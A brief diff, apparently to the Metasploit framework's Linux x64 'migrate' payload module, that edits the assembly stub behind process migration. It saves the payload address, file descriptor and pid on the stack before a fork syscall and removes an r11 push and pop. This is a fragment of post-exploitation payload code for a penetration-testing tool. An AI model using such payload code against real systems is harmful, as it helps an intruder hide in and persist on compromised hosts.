@@ -25,8 +25,13 @@ module Payload::Linux::X64::Migrate
   # Constructs the migrate stub on the fly
   #
   def generate(opts={})
+  # rax - payload address
+  # rbx - current pid
+  # ecx - fd
     asm = %^
-      push r11
+      push rax ; payload address
+      push rcx ; fd
+      push rbx ; current pod
       xor rax, rax
       push 0x39
       pop rax
@@ -36,7 +41,6 @@ module Payload::Linux::X64::Migrate
 _exec_parent:
       int 3
 _exec_child:
-      pop r11
       #{generate_migrate(opts)}
 ^
 
